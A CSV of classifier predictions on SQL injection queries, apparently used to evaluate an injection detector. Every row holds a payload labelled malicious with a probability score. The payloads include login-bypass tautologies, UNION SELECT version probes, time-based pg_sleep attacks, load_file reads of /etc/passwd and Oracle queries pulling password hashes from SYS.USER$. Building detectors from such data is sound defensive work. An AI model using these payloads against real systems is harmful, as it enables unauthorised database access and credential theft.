Query,Label,predicted,correct,malicious_probability
""" or pg_sleep  (  __TIME__  )  --",1,1,True,0.999878164012369
create user name identified by pass123 temporary tablespace temp default tablespace users;,1,1,True,0.586400955440846
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.9580680613599474
" select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,1,True,0.9999654055676339
" select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1,1,True,0.9995772312011388
 select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1,1,True,0.9901753900930538
select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,1,True,0.9998702345306801
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1,1,True,0.9918396119788094
" select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1,1,True,0.9999687005987346
" select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",1,1,True,0.9999695885374035
? or 1  =  1 --,1,1,True,0.999984095154538
 )   or   (  'a'  =  'a,1,1,True,0.9996081639750828
admin' or 1  =  1#,1,1,True,0.9999999966567914
" select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1,1,True,0.9998283100887461
or 1  =  1 --,1,1,True,0.9999901970364408
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1,True,0.9853255904250786
" select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",1,1,True,0.9999546392691331
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",1,1,True,0.9998283100887461
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1,1,True,0.9998283100887461
distinct,1,1,True,0.8197285466253299
select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1',1,1,True,0.9999929042992313
"1 and ascii  (  lower  (  substring   (    (   select top 1 name from sysobjects where xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1,1,True,0.94742548866555
select * from users where id  =  1 or \.<\ or 1  =  1 -- 1,1,1,True,0.9998566951433442
"admin"" or ""1""  =  ""1""--",1,1,True,0.9999999979929635
" select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
insert,1,1,True,0.8740942613512463
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",1,1,True,0.9998605743866823
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1,True,0.9719252817754545
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
"or 1  =  1 or """"  =  ",1,1,True,0.9937908019738094
/**/or/**/1/**/  =  /**/1,1,1,True,0.9999999986094998
" select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,1,True,0.9998283100887461
" select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,1,True,0.9999539830134838
" select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,1,True,0.9999660774716556
or 1  =  1/*,1,1,True,0.9997723903571546
%27 or 1  =  1,1,1,True,0.9984744841298224
" select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,1,True,0.9994924703588305
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,1,True,0.9999678298741589
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,1,True,0.9782332156548729
" select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,1,True,0.9999811315603335
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,1,True,0.9998669523453189
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,1,True,0.9999695885374035
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,1,True,0.9995310211056808
" select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9996438046751959
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,1,True,0.9999920188383431
" select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
" select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,1,True,0.9998433218282563
or 1 --',1,1,True,0.99999984882654
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
"admin"" or 1  =  1#",1,1,True,0.999999972234812
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,1,True,0.9996005215082635
\x27UNION SELECT,1,1,True,0.9999999362365443
PRINT,1,1,True,0.984339300349498
" select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,1,True,0.9999629842300397
or 1  =  1--,1,1,True,0.9999807028779228
1 or pg_sleep  (  __TIME__  )  --,1,1,True,0.9999213944468531
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,1,True,0.9998433218282563
admin'  )   or   (  '1'  =  '1'/*,1,1,True,0.9999999999656717
or 2 between 1 and 3,1,1,True,0.9885982120162389
